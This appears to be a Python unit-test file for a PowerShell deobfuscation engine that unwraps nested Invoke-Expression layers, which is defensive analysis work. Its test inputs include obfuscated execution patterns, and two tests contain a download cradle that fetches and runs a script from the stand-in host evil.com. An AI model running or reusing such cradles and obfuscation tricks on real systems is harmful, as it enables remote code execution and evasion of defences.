"""
Unit and integration tests for PowerShell AST IEX wrapper tracking and peeling engine.
Tests recursive peeling across direct cmdlets, call operators, ScriptBlock.Create,
ExecutionContext, pipelines, multi-layer nesting, and forensic telemetry.
"""

import json
import unittest

from src.ast_nodes import (
    CommandNode,
    IdentifierNode,
    ParenthesizedExpressionNode,
    ScriptBlockNode,
    StringLiteralNode,
)
from src.deobfuscator_engine import PowerShellDeobfuscator
from src.iex_unwrapper import (
    IEXLayer,
    IEXUnwrapResult,
    PowerShellIEXUnwrapper,
    peel_iex_string,
    trace_iex_layers,
    unwrap_iex,
)
from src.lexer import PowerShellLexer
from src.normalizer import PowerShellNormalizer
from src.parser import PowerShellParser


class TestPowerShellIEXUnwrapper(unittest.TestCase):
    """Test suite for IEX wrapper tracking, peeling, and telemetry extraction."""

    def _parse(self, script: str) -> ScriptBlockNode:
        lexer = PowerShellLexer(script)
        tokens = lexer.tokenize()
        parser = PowerShellParser(tokens)
        return parser.parse()

    def _normalize(self, script: str, symbols=None, unwrap_iex=True) -> str:
        ast = self._parse(script)
        normalizer = PowerShellNormalizer(symbols=symbols, unwrap_iex=unwrap_iex)
        norm_ast = normalizer.normalize(ast)
        return normalizer.to_source(norm_ast)

    def test_direct_iex_command_single_statement(self):
        script = "iex 'Write-Host \"hello\"'"
        result = self._normalize(script)
        self.assertEqual(result, 'Write-Host "hello"')

    def test_direct_invoke_expression(self):
        script = 'Invoke-Expression "Get-Process"'
        result = self._normalize(script)
        self.assertEqual(result, "Get-Process")

    def test_case_insensitive_iex(self):
        script = "IEX 'calc.exe'"
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_multi_nested_iex_commands(self):
        script = 'iex (iex (iex "whoami"))'
        ast = self._parse(script)
        unwrapper = PowerShellIEXUnwrapper()
        telemetry = unwrapper.unwrap_with_telemetry(ast)
        norm = PowerShellNormalizer()
        result = norm.to_source(telemetry.unwrapped_ast)

        self.assertEqual(result, "whoami")
        self.assertTrue(telemetry.is_peeled)
        self.assertGreaterEqual(telemetry.total_depth, 2)
        self.assertIn("cmdlet", telemetry.vectors)

    def test_iex_nested_string_payload(self):
        script = 'iex \'iex "calc.exe"\''
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_triple_nested_string_payload(self):
        script = "iex 'iex \"iex \'\'whoami\'\'\"'"
        result = self._normalize(script)
        self.assertEqual(result, "whoami")

    def test_pipeline_iex(self):
        script = "'calc.exe' | iex"
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_multi_stage_pipeline_iex(self):
        script = "'whoami' | iex | iex"
        result = self._normalize(script)
        self.assertEqual(result, "whoami")

    def test_call_operator_iex_single_quote(self):
        script = "& 'iex' 'Get-Process'"
        result = self._normalize(script)
        self.assertEqual(result, "Get-Process")

    def test_call_operator_iex_double_quote(self):
        script = '& "Invoke-Expression" "calc.exe"'
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_call_operator_iex_identifier(self):
        script = "& iex 'calc.exe'"
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_dot_operator_iex(self):
        script = ". 'iex' 'Get-Service'"
        result = self._normalize(script)
        self.assertEqual(result, "Get-Service")

    def test_alias_variable_call_operator(self):
        script = "$a = 'iex'; & $a 'calc.exe'"
        result = self._normalize(script)
        self.assertIn("calc.exe", result)

    def test_scriptblock_create_invoke(self):
        script = '[scriptblock]::Create("Write-Host \'pwned\'").Invoke()'
        result = self._normalize(script)
        self.assertEqual(result, "Write-Host 'pwned'")

    def test_scriptblock_create_invoke_return_as_is(self):
        script = '[ScriptBlock]::Create("whoami").InvokeReturnAsIs()'
        result = self._normalize(script)
        self.assertEqual(result, "whoami")

    def test_execution_context_invoke_script(self):
        script = '$ExecutionContext.InvokeCommand.InvokeScript("calc.exe")'
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_multi_statement_scriptblock_flattening(self):
        script = "iex '$x = 1; $y = 2; Write-Host ($x + $y)'"
        result = self._normalize(script)
        self.assertIn("$x = 1", result)
        self.assertIn("$y = 2", result)
        self.assertIn("Write-Host", result)
        self.assertNotIn("iex", result)

    def test_dynamic_download_cradle_retained(self):
        script = "iex (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
        result = self._normalize(script)
        self.assertIn("iex", result)
        self.assertIn("DownloadString", result)

    def test_redundant_outer_iex_on_download_cradle(self):
        script = "iex (iex ((New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')))"
        result = self._normalize(script)
        self.assertIn("iex", result)
        self.assertIn("DownloadString", result)
        # Should only have one outer iex remaining
        self.assertEqual(result.count("iex"), 1)

    def test_iex_with_format_operator(self):
        script = "iex ('{0}{1}' -f 'calc', '.exe')"
        result = self._normalize(script)
        self.assertEqual(result, "calc.exe")

    def test_iex_with_xor_loop_integration(self):
        # 0x77 ^ 0x10 = 0x67 ('g'), 0x75 ^ 0x10 = 0x65 ('e'), 0x64 ^ 0x10 = 0x74 ('t') -> 'get'
        script = "iex ([System.Text.Encoding]::ASCII.GetString(@(0x77, 0x75, 0x64) | % { $_ -bxor 0x10 }))"
        deobfuscator = PowerShellDeobfuscator()
        result = deobfuscator.deobfuscate(script)
        self.assertEqual(result, "get")

    def test_iex_with_base64_encoded_command(self):
        # Base64 UTF-16LE for 'whoami' is 'dwBoAG8AYQBtAGkA'
        script = "iex 'powershell -enc dwBoAG8AYQBtAGkA'"
        deobfuscator = PowerShellDeobfuscator()
        result = deobfuscator.deobfuscate(script)
        self.assertEqual(result, "whoami")

    def test_no_unwrap_iex_flag(self):
        script = "iex 'calc.exe'"
        result = self._normalize(script, unwrap_iex=False)
        self.assertEqual(result, "iex 'calc.exe'")

    def test_trace_iex_layers_telemetry(self):
        script = "iex (iex 'calc.exe')"
        ast = self._parse(script)
        telemetry = trace_iex_layers(ast)
        self.assertTrue(telemetry.is_peeled)
        self.assertGreaterEqual(telemetry.total_depth, 2)
        d = telemetry.to_dict()
        self.assertIn("layers", d)
        self.assertIn("vectors", d)
        self.assertEqual(d["is_peeled"], True)

    def test_peel_iex_string_helper(self):
        script = "iex 'Get-Process'"
        result = peel_iex_string(script)
        self.assertEqual(result, "Get-Process")

    def test_hash_cycle_prevention(self):
        # Construct a synthetic cycle where an unwrapped string parses to the same string
        unwrapper = PowerShellIEXUnwrapper()
        node = CommandNode(
            target=IdentifierNode(name="iex"),
            arguments=[StringLiteralNode(value="iex 'calc.exe'")],
        )
        # Should peel cleanly to calc.exe without looping
        res = unwrapper.unwrap(node)
        self.assertEqual(PowerShellNormalizer().to_source(res), "calc.exe")

    def test_malformed_inner_string_safe_fallback(self):
        # A string that fails syntax parsing should not crash the engine
        script = "iex 'this is not valid PowerShell { (['"
        result = self._normalize(script)
        # Should safely retain the command
        self.assertIn("iex", result)


if __name__ == "__main__":
    unittest.main()
